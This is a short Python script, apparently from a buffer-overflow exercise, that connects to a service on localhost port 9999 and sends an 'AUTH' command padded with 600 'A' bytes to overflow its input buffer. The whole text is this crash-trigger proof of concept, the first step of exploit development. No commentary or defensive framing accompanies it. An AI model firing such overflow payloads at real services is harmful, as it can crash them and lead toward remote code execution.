import socket
target_ip = "127.0.0.1"
target_port = 9999
buffer = b"A" * 600
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.recv(1024)
s.send(b"AUTH " + buffer)
s.close()
